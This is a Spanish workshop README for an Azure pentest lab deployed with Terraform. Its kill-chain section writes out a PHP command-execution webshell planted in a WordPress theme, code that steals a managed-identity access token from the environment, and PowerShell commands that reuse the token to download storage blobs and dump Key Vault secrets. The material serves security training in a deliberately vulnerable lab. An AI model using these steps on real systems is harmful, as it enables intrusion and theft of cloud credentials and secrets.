
# Taller Sh3llcon - Azure Pentest

Consiste en un pequeño script escrito en Terraform para el despligue de un entorno vulnerable en Azure. Se trabajará con él durante el taller de la Sh3llcon.

Se necesitará contar con una subscripción en azure. Se puede obtener un mes gratuito con un máximo de 200$ unicamente si es la primera vez que se ha registrado con un telefono, correo y tarjeta bancaria diferentes. 

El proceso y guia de instalación se ha realizado sobre una Kali Linux, por lo que es recomendable utilizar el mismo entorno para poder seguir con el procedimiento.
## Pasos iniciales

#### Creación de una subscripción gratuita en azure

Creación de una cuenta de correo. Ir a https://signup.live.com/. Una vez registrado, ir al portal de registro de azure https://signup.azure.com/ y crear una subscripción. Se deberá añadir un teléfono y tarjeta bancaria válida.

Una vez se disponga de la subscripción gratuita de Azure, ya podemos desplegar la infraestructura con terraform.

#### Descargar terraform
Ir a https://developer.hashicorp.com/terraform/install y seleccionar la descargar del binario AMD64 para Linux



```bash
  unzip terraform_1.6.6_linux_amd64.zip
  mv ~/Downloads/terraform /usr/local/bin/
```

Comprobamos que podemos ejecutar terraform.

```bash
  terraform -help
```

#### Despligue de la infraestructura

Clonamos el repositorio de github

```bash
  git clone //TODO
  cd //TODO
```
Ejecutamos la inicialización de las variables del terraform

```bash
  terraform init
```

Se necesita instalar `azure cli` para Linux:

```bash
  sudo apt-get install azure-cli
```

Para poder ejecutar la validación de la configuración del terraform

```bash
  terraform validate
```

Antes de crear un plan de despliegue, nos tenemos que autenticar contra Azure para saber sobre qué entorno se van a producir los cambios. Al ejecutar el siguiente comando se abrirá una pestaña de navegación para introducir las credenciales


```bash
  az login
```
Creamos el plan con:

```bash
  terraform plan
```

Ejecutamos la creación de los recursos en azure

```bash
  terraform apply
```
Nos pedirá confirmación con un `yes`

(Si en este paso se produce un error, se depura y se logra corregir el fallo, antes de realizar una nueva ejecución se deben borrar los recursos creados en el Terraform, asi como borrar el fichero `.tfstate` dentro de la carpeta raiz del proyecto. Además, es recomendable volver a realizar los pasos desde `terraform init`)



## Desarrollo de la Kill Chain

####  Abuso de Web App & Robo de Token

En este escenario se cuenta con un `assume breach` de las credenciales de `Administrador` de wordpress (aparecen al final de la ejecución de `terraform apply`). Una vez inicamos sesión en `wp-login.php` y accedemos al panel de administración, seleccionamos el tema sobre el que vamos a realizar un ejercicio tipico de CTF (una webshell en PHP). Modificamos la plantilla `footer.php` añadiendo:


```bash
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
system($_GET['cmd']);
}
?>
</pre>
```

Sobre la página de inicio, existe un nuevo campo de entrada de texto sobre la cual contamos con RCE. Necesitamos extraer la suguiente información para impersonar el usuario Managed Identity:

- IDENTITY_HEADER
- IDENTITY_ENDPOINT

Podemos ejecutar tanto `env` como `echo $variable` para obtener estos campos.

A continuación añadiremos sobre la plantilla modificada anteriormente un código que realizará una llamada a la API de `management.azure.com` para solicitar un token de acceso del usuario que esta utilizando el Wordpress:

```bash
<?php
$progressPreference = 'SilentlyContinue';
$identityHeader = getenv('IDENTITY_HEADER');
$headers = array(
	"secret: $identityHeader"
);
$endpoint = getenv('IDENTITY_ENDPOINT');
$resource = 'https://management.azure.com/';
$apiVersion = '2017-09-01';
$url = "$endpoint?resource=$resource&api-version=$apiVersion";
$response = file_get_contents($url, false, stream_context_create(array(
	"http" => array (
		"method" => "GET",
		"header" => implode("\r\n", $headers)
	)
)));

echo $response
?>
```

Al acceder nuevamente al Wordpress, aparecerá un json con el `access_token` y el `client_id` sobre el que podremos impersonar el usuario utilizando el modulo de Azure para Powershell.


En nuestra terminal de kali, entramos a Powershell e instalamos el módulo de `Azure Powershell`

```bash
    pwsh
    Install-Module -Name Az -Repository PSGallery -Force
```
Y generamos la autenticación sobre el portal de azure con el token

```bash
    $token = "<<TU_TOKEN>>"
    Connect-AzAccount -AccessToken $token -AccountId <<CLIENT_ID>>
```

####  Abuso de Blob

```bash
    # Obtengo los recursos que el usuario actual puede listar
    Get-AzResource
    # Obtengo los contenedores disponibles dentro de la cuenta de almacenamiento
    Get-AzStorageContainer -Context (Get-AzStorageAccount -name NOMBRE_CUENTA_DE_ALMACENAMIENTO -ResourceGroupName NOMBRE_GRUPO_RECURSOS).context
    # Obtengo los ficheros disponibles dentro del contenedor en el contexto de la cuenta de almacenamiento         
    Get-AzStorageBlob -Container NOMBRE_CONTENDOR -Context (Get-AzStorageAccount -name NOMBRE_CUENTA_DE_ALMACENAMIENTO -ResourceGroupName NOMBRE_GRUPO_RECURSOS).context
    # Descargo el contenido del blob
    Get-AzStorageBlobContent -Container NOMBRE_CONTENDOR -Context (Get-AzStorageAccount -name NOMBRE_CUENTA_DE_ALMACENAMIENTO -ResourceGroupName NOMBRE_GRUPO_RECURSOS).context -Blob NOMBRE_BLOB -Destination .\NOMBRE_BLOB
```

####  Autenticación con credenciales de azure 

```bash
    $passwd = ConvertTo-SecureString "" -AsPlainText -Force
    $creds = New-Object System.Management.Automation.PSCredential("brock@DOMAIN_NAME.onmicrosoft.com", $passwd)
    Connect-azaccount -Credential $creds
```


####  Abuso de keyvault

```bash
    # Obtengo los recursos que el usuario actual puede listar
    Get-AzResource
    # Al igual que Get-AzResource, lista los recursos, pero únicamente los de tipo Keyvault
    Get-AzKeyVault
    # Obtengo los secretos dentro del Keyvault. Tener en cuenta que los Certificados y Claves se listan con otro comando
    Get-AzKeyVaultSecret -VaultName NOMBRE_VAULT
    # Obtengo la clave del secreto dado el valor de este en el contexto del Keyvault 
Get-AzKeyVaultSecret -VaultName NOMBRE_VAULT -Name NOMBRE_CLAVE –AsPlainText
```










